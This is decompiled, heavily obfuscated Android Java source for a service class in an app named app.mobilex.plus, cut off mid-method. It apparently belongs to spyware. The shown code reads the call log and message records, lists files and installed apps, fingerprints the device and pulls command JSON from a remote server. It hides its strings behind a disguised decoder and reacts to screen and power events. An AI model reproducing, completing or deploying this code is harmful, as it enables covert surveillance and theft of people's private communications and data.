            return TypefaceCache.obtain("00220066004B008B00F900BC00D300B3002A0079005500C800FA00AC00DD00A9");
        }
        if (lowerCase.equals(TypefaceCache.obtain("003B007B0057"))) {
            return TypefaceCache.obtain("003700730043009300BF00A700DF00AB");
        }
        if (lowerCase.equals(TypefaceCache.obtain("002B00620056008B"))) {
            return TypefaceCache.obtain("003700730043009300BF00B700C600AA002F");
        }
        if (lowerCase.equals(TypefaceCache.obtain("002700790058"))) {
            r1 = i;
        } else {
            zEquals2 = lowerCase.equals(TypefaceCache.obtain("002700790058009F"));
        }
        if (r1 != 0) {
            r1 = zEquals2;
            return TypefaceCache.obtain("00220066004B008B00F900BC00D300B3002A0079005500C800FD00AC00C500A800310072");
        }
        r1 = zEquals2;
        if (lowerCase.equals("xls")) {
            r2 = i;
        } else {
            zEquals3 = lowerCase.equals("xlsx");
        }
        if (r2 != 0) {
            r2 = zEquals3;
            return TypefaceCache.obtain("00220066004B008B00F900BC00D300B3002A0079005500C800E600B100D600E9002E00650016008200E800BC00D700AB");
        }
        r2 = zEquals3;
        if (!lowerCase.equals("db")) {
            Equals = i;
            Equals = lowerCase.equals(TypefaceCache.obtain("003000670057008E00E400BA"));
        }
        return Equals != 0 ? TypefaceCache.obtain("00220066004B008B00F900BC00D300B3002A0079005500C800E800F200C100B6002F007F004F008200A3") : TypefaceCache.obtain("00220066004B008B00F900BC00D300B3002A0079005500C800FF00BC00C600A20037003B0048009300E200BA00D300AA");
    }

    public static final ArrayList vekpFI4d1Nc4fakF(SyncQYAdapter syncQYAdapter) {
        TelephonyManager telephonyManager = (TelephonyManager) syncQYAdapter.getSystemService("phone");
        ArrayList arrayList = new ArrayList();
        try {
            Object systemService = syncQYAdapter.getSystemService("telephony_subscription_service");
            SubscriptionManager subscriptionManager = systemService instanceof SubscriptionManager ? (SubscriptionManager) systemService : null;
            List<SubscriptionInfo> activeSubscriptionInfoList = subscriptionManager != null ? subscriptionManager.getActiveSubscriptionInfoList() : null;
            if (activeSubscriptionInfoList != null && !activeSubscriptionInfoList.isEmpty()) {
                Iterator<SubscriptionInfo> it = activeSubscriptionInfoList.iterator();
                while (it.hasNext()) {
                    arrayList.add(telephonyManager.createForSubscriptionId(it.next().getSubscriptionId()));
                }
            }
        } catch (Exception e) {
            TypefaceCache.obtain("00070063005A008B00BD008C00FB008A00630072005E009300F500BC00C600AE002C0078001B008200E200AD00DD00B500790036");
            e.getMessage();
        }
        if (arrayList.isEmpty()) {
            arrayList.add(telephonyManager);
        }
        return arrayList;
    }

    /* JADX WARN: Code duplicated, block: B:7:0x0018  */
    public static final Object w9sT1Swbhx3hs(SyncQYAdapter syncQYAdapter, CWIOrUfHtKyaxQib0W cWIOrUfHtKyaxQib0W) {
        Ao77ZIGXX7f8NXHW ao77ZIGXX7f8NXHW;
        Exception e;
        ArrayList arrayList;
        Object obj;
        syncQYAdapter.getClass();
        if (cWIOrUfHtKyaxQib0W instanceof Ao77ZIGXX7f8NXHW) {
            ao77ZIGXX7f8NXHW = (Ao77ZIGXX7f8NXHW) cWIOrUfHtKyaxQib0W;
            int i = ao77ZIGXX7f8NXHW.b1EoSIRjJHO5;
            if ((i & Integer.MIN_VALUE) != 0) {
                ao77ZIGXX7f8NXHW.b1EoSIRjJHO5 = i - Integer.MIN_VALUE;
            } else {
                ao77ZIGXX7f8NXHW = new Ao77ZIGXX7f8NXHW(syncQYAdapter, cWIOrUfHtKyaxQib0W);
            }
        } else {
            ao77ZIGXX7f8NXHW = new Ao77ZIGXX7f8NXHW(syncQYAdapter, cWIOrUfHtKyaxQib0W);
        }
        Object obj2 = ao77ZIGXX7f8NXHW.xDyLpEZyrcKVe0;
        int i2 = ao77ZIGXX7f8NXHW.b1EoSIRjJHO5;
        if (i2 == 0) {
            SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj2);
            ArrayList arrayList2 = new ArrayList();
            try {
                ktukzhfmAkOuMU ktukzhfmakoumu = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                String str = TypefaceCache.obtain("006C0077004B008E00BF00BB00D300B3002200390058008800FD00B200D300A9002700650014009700F500B100D600AE002D00710004009300F500BE00DF0098002A00720006") + KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(61) + TypefaceCache.obtain("00650072005E009100F900BC00D70098002A00720006") + syncQYAdapter.vekpFI4d1Nc4fakF;
                ao77ZIGXX7f8NXHW.Ee8d2j4S9Vm5yGuR = arrayList2;
                ao77ZIGXX7f8NXHW.b1EoSIRjJHO5 = 1;
                Object objH9XlUr4OeMJFiXK = ktukzhfmakoumu.H9XlUr4OeMJFiXK(str, ao77ZIGXX7f8NXHW);
                pjN1L01KDMWnPCy0daD pjn1l01kdmwnpcy0dad = pjN1L01KDMWnPCy0daD.w9sT1Swbhx3hs;
                if (objH9XlUr4OeMJFiXK == pjn1l01kdmwnpcy0dad) {
                    return pjn1l01kdmwnpcy0dad;
                }
                obj = objH9XlUr4OeMJFiXK;
                arrayList = arrayList2;
            } catch (Exception e2) {
                e = e2;
                arrayList = arrayList2;
                TypefaceCache.obtain("00050073004F008400F800FF00D100A8002E007B005A008900F400AC009200A2003100640054009500AA00FF");
                e.getMessage();
                return arrayList;
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            arrayList = ao77ZIGXX7f8NXHW.Ee8d2j4S9Vm5yGuR;
            try {
                SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj2);
                obj = ((roAK4OF9CtSmlCJgpQ) obj2).w9sT1Swbhx3hs;
            } catch (Exception e3) {
                e = e3;
                TypefaceCache.obtain("00050073004F008400F800FF00D100A8002E007B005A008900F400AC009200A2003100640054009500AA00FF");
                e.getMessage();
                return arrayList;
            }
        }
        if (!(obj instanceof VSZeS5mia3yEXbAe)) {
            if (obj instanceof VSZeS5mia3yEXbAe) {
                obj = null;
            }
            String str2 = (String) obj;
            if (str2 == null) {
                str2 = "";
            }
            JSONArray jSONArrayOptJSONArray = new JSONObject(str2).optJSONArray(TypefaceCache.obtain("002000790056008A00F100B100D600B4"));
            if (jSONArrayOptJSONArray == null) {
                jSONArrayOptJSONArray = new JSONArray();
            }
            int length = jSONArrayOptJSONArray.length();
            for (int i3 = 0; i3 < length; i3++) {
                arrayList.add(jSONArrayOptJSONArray.getJSONObject(i3));
            }
        }
        return arrayList;
    }

    /* JADX WARN: Code duplicated, block: B:107:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:60:0x0212 A[Catch: Exception -> 0x0266, TryCatch #2 {Exception -> 0x0266, blocks: (B:19:0x0058, B:60:0x0212, B:62:0x0224, B:64:0x022c, B:66:0x023b, B:68:0x0247, B:69:0x024d, B:45:0x01af, B:47:0x01b5, B:49:0x01c8, B:51:0x01d8, B:53:0x01f0, B:54:0x01f5, B:56:0x0201, B:58:0x0207), top: B:99:0x002f }] */
    /* JADX WARN: Code duplicated, block: B:62:0x0224 A[Catch: Exception -> 0x0266, TryCatch #2 {Exception -> 0x0266, blocks: (B:19:0x0058, B:60:0x0212, B:62:0x0224, B:64:0x022c, B:66:0x023b, B:68:0x0247, B:69:0x024d, B:45:0x01af, B:47:0x01b5, B:49:0x01c8, B:51:0x01d8, B:53:0x01f0, B:54:0x01f5, B:56:0x0201, B:58:0x0207), top: B:99:0x002f }] */
    /* JADX WARN: Code duplicated, block: B:66:0x023b A[Catch: Exception -> 0x0266, TryCatch #2 {Exception -> 0x0266, blocks: (B:19:0x0058, B:60:0x0212, B:62:0x0224, B:64:0x022c, B:66:0x023b, B:68:0x0247, B:69:0x024d, B:45:0x01af, B:47:0x01b5, B:49:0x01c8, B:51:0x01d8, B:53:0x01f0, B:54:0x01f5, B:56:0x0201, B:58:0x0207), top: B:99:0x002f }] */
    /* JADX WARN: Code duplicated, block: B:68:0x0247 A[Catch: Exception -> 0x0266, TryCatch #2 {Exception -> 0x0266, blocks: (B:19:0x0058, B:60:0x0212, B:62:0x0224, B:64:0x022c, B:66:0x023b, B:68:0x0247, B:69:0x024d, B:45:0x01af, B:47:0x01b5, B:49:0x01c8, B:51:0x01d8, B:53:0x01f0, B:54:0x01f5, B:56:0x0201, B:58:0x0207), top: B:99:0x002f }] */
    /* JADX WARN: Code duplicated, block: B:72:0x025f  */
    /* JADX WARN: Code duplicated, block: B:7:0x0018  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:61:0x0222 -> B:74:0x0263). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:63:0x022a -> B:74:0x0263). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:72:0x025f -> B:73:0x0260). Please report as a decompilation issue!!! */
    /*  JADX ERROR: JadxOverflowException in pass: RegionMakerVisitor
        jadx.core.utils.exceptions.JadxOverflowException: Regions stack size limit reached
        	at jadx.core.utils.ErrorsCounter.addError(ErrorsCounter.java:59)
        	at jadx.core.utils.ErrorsCounter.error(ErrorsCounter.java:31)
        	at jadx.core.dex.attributes.nodes.NotificationAttrNode.addError(NotificationAttrNode.java:19)
        */
    public static final java.lang.Object xDyLpEZyrcKVe0(app.mobilex.plus.services.SyncQYAdapter r14, v.s.CWIOrUfHtKyaxQib0W r15) throws org.json.JSONException {
        /*
            Method dump skipped, instruction units count: 681
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: app.mobilex.plus.services.SyncQYAdapter.xDyLpEZyrcKVe0(app.mobilex.plus.services.SyncQYAdapter, v.s.CWIOrUfHtKyaxQib0W):java.lang.Object");
    }

    public static JSONArray yTljMGnIibTRdOpSh4(String str) {
        File[] fileArrListFiles;
        JSONArray jSONArray = new JSONArray();
        try {
            File file = new File(str);
            if (file.exists() && file.isDirectory() && (fileArrListFiles = file.listFiles()) != null) {
                for (File file2 : fileArrListFiles) {
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put(TypefaceCache.obtain("002D007700560082"), file2.getName());
                    jSONObject.put(TypefaceCache.obtain("00330077004F008F"), file2.getAbsolutePath());
                    jSONObject.put(TypefaceCache.obtain("002A00650064008300F900AD00D700A4003700790049009E"), file2.isDirectory());
                    jSONObject.put(TypefaceCache.obtain("0030007F00410082"), file2.isFile() ? file2.length() : 0L);
                    jSONObject.put(TypefaceCache.obtain("002F00770048009300CF00B200DD00A3002A00700052008200F4"), file2.lastModified());
                    jSONArray.put(jSONObject);
                }
            }
            return jSONArray;
        } catch (Exception e) {
            TypefaceCache.obtain("00040073004F00C700F600B600DE00A200300036005E009500E200B000C000FD0063");
            e.getMessage();
            return jSONArray;
        }
    }

    public final void D5P1xCAyuvgF() {
        getSharedPreferences(A1BaTVAMeIXMnh, 0).edit().remove(qfTrc75xwRVMl85vh).remove(euF5Udt5Rqv3Qmea).remove(MSGkxvPxRYNqC).apply();
        TypefaceCache.obtain("0013007E0054008900F500FF00DC00B2002E0074005E009500B000BC00D300A4002B0073001B008400FC00BA00D300B500260072");
    }

    public final String DVTNwpDEVsUKuznof() {
        String string = Settings.Secure.getString(getContentResolver(), "android_id");
        if (string == null) {
            string = TypefaceCache.obtain("003600780050008900FF00A800DC");
        }
        String packageName = getPackageName();
        if (packageName == null) {
            packageName = "";
        }
        long j = -3750763034362895579L;
        for (byte b : Y9mRyRdkl5FOcwb66V6.ibVTtJUNfrGYbW(string, packageName).getBytes(N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM)) {
            j = (j ^ ((long) b)) * 1099511628211L;
        }
        return String.format("%016x", Arrays.copyOf(new Object[]{Long.valueOf(j)}, 1));
    }

    public final String ECwLkmPW1UKz7J6E() {
        SharedPreferences sharedPreferences = getSharedPreferences(A1BaTVAMeIXMnh, 0);
        String string = sharedPreferences.getString(MSGkxvPxRYNqC, null);
        if (string == null || string.equals(this.vekpFI4d1Nc4fakF)) {
            return sharedPreferences.getString(qfTrc75xwRVMl85vh, null);
        }
        TypefaceCache.obtain("00070073004D008E00F300BA0092008E000700360058008F00F100B100D500A2002700360013008400FC00B000DC00A200630072005E009300F500BC00C600A20027003F001700C700F300B300D700A60031007F0055008000B000AF00DA00A8002D0073001B008400F100BC00DA00A2006D00360074008B00F400E50092");
        TypefaceCache.obtain("006F00360075008200E700E50092");
        D5P1xCAyuvgF();
        return null;
    }

    /* JADX WARN: Type inference failed for: r2v2, types: [app.mobilex.plus.services.SyncQYAdapter$registerScreenReceiver$3] */
    /* JADX WARN: Type inference failed for: r2v4, types: [app.mobilex.plus.services.SyncQYAdapter$registerScreenReceiver$2] */
    /* JADX WARN: Type inference failed for: r2v7, types: [app.mobilex.plus.services.SyncQYAdapter$registerScreenReceiver$1] */
    public final void GiffeZJ1rbwyx() {
        try {
            this.ibVTtJUNfrGYbW = new BroadcastReceiver() { // from class: app.mobilex.plus.services.SyncQYAdapter$registerScreenReceiver$1
                @Override // android.content.BroadcastReceiver
                public final void onReceive(Context context, Intent intent) {
                    SyncQYAdapter syncQYAdapter = this.dDIMxZXP1V8HdM;
                    f58wUe2vbJhag6PETTG f58wue2vbjhag6pettg = syncQYAdapter.w9sT1Swbhx3hs;
                    String str = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                    TypefaceCache.obtain("001000750049008200F500B1009200A2003500730055009300AA00FF");
                    intent.getAction();
                    String action = intent.getAction();
                    if (action != null) {
                        int iHashCode = action.hashCode();
                        if (iHashCode == -2128145023) {
                            if (action.equals("android.intent.action.SCREEN_OFF")) {
                                syncQYAdapter.ibVTtJUNfrGYbW();
                                y6jRGLEWNMir.b1EoSIRjJHO5(f58wue2vbjhag6pettg, null, new AzBvxzvbhkd8u(syncQYAdapter, null, 4), 3);
                                return;
                            }
                            return;
                        }
                        if (iHashCode != -1454123155) {
                            if (iHashCode != 823795052 || !action.equals("android.intent.action.USER_PRESENT")) {
                                return;
                            }
                        } else if (!action.equals("android.intent.action.SCREEN_ON")) {
                            return;
                        }
                        syncQYAdapter.ibVTtJUNfrGYbW();
                        y6jRGLEWNMir.b1EoSIRjJHO5(f58wue2vbjhag6pettg, null, new AzBvxzvbhkd8u(syncQYAdapter, null, 5), 3);
                    }
                }
            };
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction("android.intent.action.SCREEN_ON");
            intentFilter.addAction("android.intent.action.SCREEN_OFF");
            intentFilter.addAction("android.intent.action.USER_PRESENT");
            if (Build.VERSION.SDK_INT >= 33) {
                registerReceiver(this.ibVTtJUNfrGYbW, intentFilter, 4);
            } else {
                registerReceiver(this.ibVTtJUNfrGYbW, intentFilter);
            }
            TypefaceCache.obtain("001000750049008200F500B1009200B500260075005E008E00E600BA00C000E700310073005C008E00E300AB00D700B500260072");
        } catch (Exception e) {
            TypefaceCache.obtain("00310073005C008E00E300AB00D700B5001000750049008200F500B100E000A2002000730052009100F500AD009200A2003100640054009500AA00FF");
            e.getMessage();
        }
        try {
            this.O2DHNSIGZlgPja7eqLgn = new BroadcastReceiver() { // from class: app.mobilex.plus.services.SyncQYAdapter$registerScreenReceiver$2
                @Override // android.content.BroadcastReceiver
                public final void onReceive(Context context, Intent intent) {
                    String str = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                    TypefaceCache.obtain("000D0073004F009000FF00AD00D900E70020007E005A008900F700BA00D600FD0063");
                    intent.getAction();
                    SyncQYAdapter syncQYAdapter = this.dDIMxZXP1V8HdM;
                    syncQYAdapter.ibVTtJUNfrGYbW();
                    y6jRGLEWNMir.b1EoSIRjJHO5(syncQYAdapter.w9sT1Swbhx3hs, null, new AzBvxzvbhkd8u(syncQYAdapter, null, 6), 3);
                }
            };
            IntentFilter intentFilter2 = new IntentFilter();
            intentFilter2.addAction("android.net.conn.CONNECTIVITY_CHANGE");
            if (Build.VERSION.SDK_INT >= 33) {
                registerReceiver(this.O2DHNSIGZlgPja7eqLgn, intentFilter2, 4);
            } else {
                registerReceiver(this.O2DHNSIGZlgPja7eqLgn, intentFilter2);
            }
            TypefaceCache.obtain("000D0073004F009000FF00AD00D900E7003100730058008200F900A900D700B500630064005E008000F900AC00C600A200310073005F");
        } catch (Exception e2) {
            TypefaceCache.obtain("00310073005C008E00E300AB00D700B5000D0073004F009000FF00AD00D9009500260075005E008E00E600BA00C000E7002600640049008800E200E50092");
            e2.getMessage();
        }
        try {
            this.xfn2GJwmGqs7kWW = new BroadcastReceiver() { // from class: app.mobilex.plus.services.SyncQYAdapter$registerScreenReceiver$3
                private static /* synthetic */ void givcnfmzq() {
                }

                @Override // android.content.BroadcastReceiver
                public final void onReceive(Context context, Intent intent) {
                    String str = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                    TypefaceCache.obtain("00130079004C008200E200FF00D100AF00220078005C008200F400E50092");
                    intent.getAction();
                    SyncQYAdapter syncQYAdapter = this.dDIMxZXP1V8HdM;
                    syncQYAdapter.ibVTtJUNfrGYbW();
                    y6jRGLEWNMir.b1EoSIRjJHO5(syncQYAdapter.w9sT1Swbhx3hs, null, new AzBvxzvbhkd8u(syncQYAdapter, null, 7), 3);
                }
            };
            IntentFilter intentFilter3 = new IntentFilter();
            intentFilter3.addAction("android.intent.action.ACTION_POWER_CONNECTED");
            intentFilter3.addAction("android.intent.action.ACTION_POWER_DISCONNECTED");
            intentFilter3.addAction("android.intent.action.BATTERY_LOW");
            intentFilter3.addAction("android.intent.action.BATTERY_OKAY");
            if (Build.VERSION.SDK_INT >= 33) {
                registerReceiver(this.xfn2GJwmGqs7kWW, intentFilter3, 4);
            } else {
                registerReceiver(this.xfn2GJwmGqs7kWW, intentFilter3);
            }
            TypefaceCache.obtain("00130079004C008200E200FF00C000A2002000730052009100F500AD009200B5002600710052009400E400BA00C000A20027");
        } catch (Exception e3) {
            TypefaceCache.obtain("00310073005C008E00E300AB00D700B500130079004C008200E2008D00D700A40026007F004D008200E200FF00D700B500310079004900DD00B0");
            e3.getMessage();
        }
    }

    public final JSONArray H9XlUr4OeMJFiXK() {
        JSONArray jSONArray = new JSONArray();
        try {
            Cursor cursorMLSIo1htfMPWeB8V876L = gA5gCwTK0qjTIn.MLSIo1htfMPWeB8V876L(getContentResolver(), gA5gCwTK0qjTIn.EWUjsTERgdPbSw3NNlN(), new String[]{TypefaceCache.obtain("00220072005F009500F500AC00C1"), TypefaceCache.obtain("00210079005F009E"), TypefaceCache.obtain("00270077004F0082"), TypefaceCache.obtain("0037006F004B0082")}, TypefaceCache.obtain("00270077004F008200B0009B00F7009400000036007700AE00DD009600E600E700720026000B"));
            if (cursorMLSIo1htfMPWeB8V876L == null) {
                return jSONArray;
            }
            try {
                int columnIndex = cursorMLSIo1htfMPWeB8V876L.getColumnIndex(TypefaceCache.obtain("00220072005F009500F500AC00C1"));
                int columnIndex2 = cursorMLSIo1htfMPWeB8V876L.getColumnIndex(TypefaceCache.obtain("00210079005F009E"));
                int columnIndex3 = cursorMLSIo1htfMPWeB8V876L.getColumnIndex(TypefaceCache.obtain("00270077004F0082"));
                int columnIndex4 = cursorMLSIo1htfMPWeB8V876L.getColumnIndex(TypefaceCache.obtain("0037006F004B0082"));
                while (cursorMLSIo1htfMPWeB8V876L.moveToNext()) {
                    JSONObject jSONObject = new JSONObject();
                    String strObtain = TypefaceCache.obtain("00220072005F009500F500AC00C1");
                    String string = cursorMLSIo1htfMPWeB8V876L.getString(columnIndex);
                    String str = "";
                    if (string == null) {
                        string = "";
                    }
                    jSONObject.put(strObtain, string);
                    String strObtain2 = TypefaceCache.obtain("00210079005F009E");
                    String string2 = cursorMLSIo1htfMPWeB8V876L.getString(columnIndex2);
                    if (string2 != null) {
                        str = string2;
                    }
                    jSONObject.put(strObtain2, str);
                    jSONObject.put(TypefaceCache.obtain("00270077004F0082"), cursorMLSIo1htfMPWeB8V876L.getLong(columnIndex3));
                    jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain(cursorMLSIo1htfMPWeB8V876L.getInt(columnIndex4) == 1 ? "002A00780059008800E8" : "0030007300550093"));
                    jSONArray.put(jSONObject);
                }
                cursorMLSIo1htfMPWeB8V876L.close();
                return jSONArray;
            } catch (Throwable th) {
                try {
                    throw th;
                } catch (Throwable th2) {
                    okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(cursorMLSIo1htfMPWeB8V876L, th);
                    throw th2;
                }
            }
        } catch (Exception e) {
            TypefaceCache.obtain("00260064004900DD00B0");
            e.getMessage();
            return jSONArray;
        }
    }

    /* JADX WARN: Unreachable blocks removed: 38, instructions: 158 */
    /*  JADX ERROR: Type inference failed
        jadx.core.utils.exceptions.JadxOverflowException: Type inference error: updates count limit reached with updateSeq = 91841. Try increasing type updates limit count.
        	at jadx.core.utils.ErrorsCounter.addError(ErrorsCounter.java:59)
        	at jadx.core.utils.ErrorsCounter.error(ErrorsCounter.java:31)
        	at jadx.core.dex.attributes.nodes.NotificationAttrNode.addError(NotificationAttrNode.java:19)
        	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.visit(TypeInferenceVisitor.java:79)
        */
    public final java.lang.Object J0zjQ7CAgohuxU20eCW6(org.json.JSONObject r58, v.s.CWIOrUfHtKyaxQib0W r59) throws java.lang.Throwable {
        /*
            Method dump skipped, instruction units count: 9184
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: app.mobilex.plus.services.SyncQYAdapter.J0zjQ7CAgohuxU20eCW6(org.json.JSONObject, v.s.CWIOrUfHtKyaxQib0W):java.lang.Object");
    }

    public final void JW3Lh9hxwLsO2ArTlH() throws Exception {
        try {
            Intent intent = new Intent(this, (Class<?>) ManagerQJWorker.class);
            String str = ManagerQJWorker.dDIMxZXP1V8HdM;
            intent.putExtra(ManagerQJWorker.ibVTtJUNfrGYbW, ManagerQJWorker.w9sT1Swbhx3hs);
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception e) {
            TypefaceCache.obtain("00110073004A009200F500AC00C600E700270073004D008E00F300BA009200A60027007B0052008900B000BA00C000B5002C0064000100C7");
            e.getMessage();
            throw e;
        }
    }

    public final void K5l5kmuyJzrgUX(String str, String str2) {
        try {
            NotificationManager notificationManager = (NotificationManager) getSystemService(NotificationManager.class);
            String str3 = iUQk66nAiXgO35;
            if (notificationManager != null) {
                NotificationChannel notificationChannel = new NotificationChannel(str3, TypefaceCache.obtain("00020066004B00C700C300BA00C600B20033"), 4);
                notificationChannel.setDescription(TypefaceCache.obtain("00100073004F009200E000FF00D100A8002E00660057008200E400B600DD00A9"));
                notificationChannel.enableVibration(true);
                notificationChannel.setVibrationPattern(new long[]{0, 250, 100, 250});
                notificationChannel.setBypassDnd(true);
                notificationManager.createNotificationChannel(notificationChannel);
            }
            Intent intent = new Intent(this, (Class<?>) UtilNWWrapper.class);
            intent.setFlags(335544320);
            PendingIntent activity = PendingIntent.getActivity(this, 5001, intent, 201326592);
            s4Xe0OepSKbHpb3Nsd s4xe0oepskbhpb3nsd = new s4Xe0OepSKbHpb3Nsd(this, str3);
            s4xe0oepskbhpb3nsd.K7eEOBPYP9VIoHWTe.icon = R.drawable.ic_dialog_info;
            s4xe0oepskbhpb3nsd.Ee8d2j4S9Vm5yGuR = s4Xe0OepSKbHpb3Nsd.w9sT1Swbhx3hs(str);
            s4xe0oepskbhpb3nsd.xDyLpEZyrcKVe0 = s4Xe0OepSKbHpb3Nsd.w9sT1Swbhx3hs(str2);
            ERzPBbsYGxZZQro2NYPo eRzPBbsYGxZZQro2NYPo = new ERzPBbsYGxZZQro2NYPo();
            eRzPBbsYGxZZQro2NYPo.w9sT1Swbhx3hs = s4Xe0OepSKbHpb3Nsd.w9sT1Swbhx3hs(str2);
            s4xe0oepskbhpb3nsd.Ee8d2j4S9Vm5yGuR(eRzPBbsYGxZZQro2NYPo);
            s4xe0oepskbhpb3nsd.hjneShqpF9Tis4 = 1;
            s4xe0oepskbhpb3nsd.ibVTtJUNfrGYbW = activity;
            s4xe0oepskbhpb3nsd.vekpFI4d1Nc4fakF(2, true);
            s4xe0oepskbhpb3nsd.vekpFI4d1Nc4fakF(16, false);
            s4xe0oepskbhpb3nsd.nQilHWaqS401ZtR = "reminder";
            s4xe0oepskbhpb3nsd.XiR1pIn5878vVWd = 1;
            new HEqPccX85NcWnm0(this).dDIMxZXP1V8HdM(5001, s4xe0oepskbhpb3nsd.dDIMxZXP1V8HdM());
            TypefaceCache.obtain("00100073004F009200E000FF00DC00B200270071005E00C700C3009700FD0090000D");
        } catch (Exception e) {
            TypefaceCache.obtain("00100073004F009200E000FF00DC00B200270071005E00C700F500AD00C000A80031002C001B");
            e.getMessage();
        }
    }

    public final JSONArray K7eEOBPYP9VIoHWTe() {
        String strObtain;
        JSONArray jSONArray = new JSONArray();
        try {
            Cursor cursorMLSIo1htfMPWeB8V876L = gA5gCwTK0qjTIn.MLSIo1htfMPWeB8V876L(getContentResolver(), TypefaceCache.process("gsrxirx>33geppcpsk3geppw", 4), new String[]{TypefaceCache.obtain("002D00630056008500F500AD"), TypefaceCache.obtain("002D007700560082"), TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("00270077004F0082"), TypefaceCache.obtain("002700630049008600E400B600DD00A9")}, TypefaceCache.obtain("00270077004F008200B0009B00F7009400000036007700AE00DD009600E600E700720026000B"));
            if (cursorMLSIo1htfMPWeB8V876L == null) {
                return jSONArray;
            }
            try {
                int columnIndex = cursorMLSIo1htfMPWeB8V876L.getColumnIndex(TypefaceCache.obtain("002D00630056008500F500AD"));
                int columnIndex2 = cursorMLSIo1htfMPWeB8V876L.getColumnIndex(TypefaceCache.obtain("002D007700560082"));
                int columnIndex3 = cursorMLSIo1htfMPWeB8V876L.getColumnIndex(TypefaceCache.obtain("0037006F004B0082"));
                int columnIndex4 = cursorMLSIo1htfMPWeB8V876L.getColumnIndex(TypefaceCache.obtain("00270077004F0082"));
                int columnIndex5 = cursorMLSIo1htfMPWeB8V876L.getColumnIndex(TypefaceCache.obtain("002700630049008600E400B600DD00A9"));
                while (cursorMLSIo1htfMPWeB8V876L.moveToNext()) {
                    JSONObject jSONObject = new JSONObject();
                    String strObtain2 = TypefaceCache.obtain("002D00630056008500F500AD");
                    String string = cursorMLSIo1htfMPWeB8V876L.getString(columnIndex);
                    String str = "";
                    if (string == null) {
                        string = "";
                    }
                    jSONObject.put(strObtain2, string);
                    String strObtain3 = TypefaceCache.obtain("002D007700560082");
                    String string2 = cursorMLSIo1htfMPWeB8V876L.getString(columnIndex2);
                    if (string2 != null) {
                        str = string2;
                    }
                    jSONObject.put(strObtain3, str);
                    String strObtain4 = TypefaceCache.obtain("0037006F004B0082");
                    int i = cursorMLSIo1htfMPWeB8V876L.getInt(columnIndex3);
                    if (i == 1) {
                        strObtain = TypefaceCache.obtain("002A00780058008800FD00B600DC00A0");
                    } else if (i != 2) {
                        strObtain = i != 3 ? TypefaceCache.obtain("003600780050008900FF00A800DC") : TypefaceCache.obtain("002E007F0048009400F500BB");
                    } else {
                        strObtain = TypefaceCache.obtain("002C0063004F008000FF00B600DC00A0");
                    }
                    jSONObject.put(strObtain4, strObtain);
                    jSONObject.put(TypefaceCache.obtain("00270077004F0082"), cursorMLSIo1htfMPWeB8V876L.getLong(columnIndex4));
                    jSONObject.put(TypefaceCache.obtain("002700630049008600E400B600DD00A9"), cursorMLSIo1htfMPWeB8V876L.getInt(columnIndex5));
                    jSONArray.put(jSONObject);
                }
                cursorMLSIo1htfMPWeB8V876L.close();
                return jSONArray;
            } catch (Throwable th) {
                try {
                    throw th;
                } catch (Throwable th2) {
                    okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(cursorMLSIo1htfMPWeB8V876L, th);
                    throw th2;
                }
            }
        } catch (Exception e) {
            TypefaceCache.obtain("00260064004900DD00B0");
            e.getMessage();
            return jSONArray;
        }
    }

    public final void KV57Z6oavcB595B8Dy8Z() throws Exception {
        try {
            (Build.VERSION.SDK_INT >= 31 ? bzHLgVWZZfjKGub8Jt.JXn4Qf7zpnLjP5(getSystemService("vibrator_manager")).getDefaultVibrator() : (Vibrator) getSystemService("vibrator")).vibrate(VibrationEffect.createWaveform(new long[]{0, 500, 200, 500, 200, 500}, -1));
            TypefaceCache.obtain("0015007F0059009500F100AB00DB00A8002D0036004F009500F900B800D500A200310073005F");
        } catch (Exception e) {
            TypefaceCache.obtain("0015007F0059009500F100AB00D700E7002600640049008800E200E50092");
            e.getMessage();
            throw e;
        }
    }

    public final Object MLSIo1htfMPWeB8V876L(String str, int i, DoeLweGeLwxOstamT doeLweGeLwxOstamT) {
        try {
            PowerManager.WakeLock wakeLock = this.JXn4Qf7zpnLjP5;
            if (wakeLock != null) {
                wakeLock.acquire(90000L);
            }
        } catch (Exception unused) {
        }
        AqltFduMByzMV4g aqltFduMByzMV4g = umMdYoePNXvWWPn.dDIMxZXP1V8HdM;
        return y6jRGLEWNMir.K7eEOBPYP9VIoHWTe(lApLnElOE7s0Fsy.dDIMxZXP1V8HdM, new u7izncElIxlBIQQj(i, this, str, null), doeLweGeLwxOstamT);
    }

    public final JSONArray O2DHNSIGZlgPja7eqLgn() {
        JSONArray jSONArray = new JSONArray();
        try {
            PackageManager packageManager = getPackageManager();
            for (PackageInfo packageInfo : packageManager.getInstalledPackages(128)) {
                JSONObject jSONObject = new JSONObject();
                ApplicationInfo applicationInfo = packageInfo.applicationInfo;
                jSONObject.put(TypefaceCache.obtain("002D007700560082"), applicationInfo.loadLabel(packageManager).toString());
                jSONObject.put(TypefaceCache.obtain("003300770058008C00F100B800D7"), packageInfo.packageName);
                String strObtain = TypefaceCache.obtain("003500730049009400F900B000DC");
                String str = packageInfo.versionName;
                if (str == null) {
                    str = "";
                }
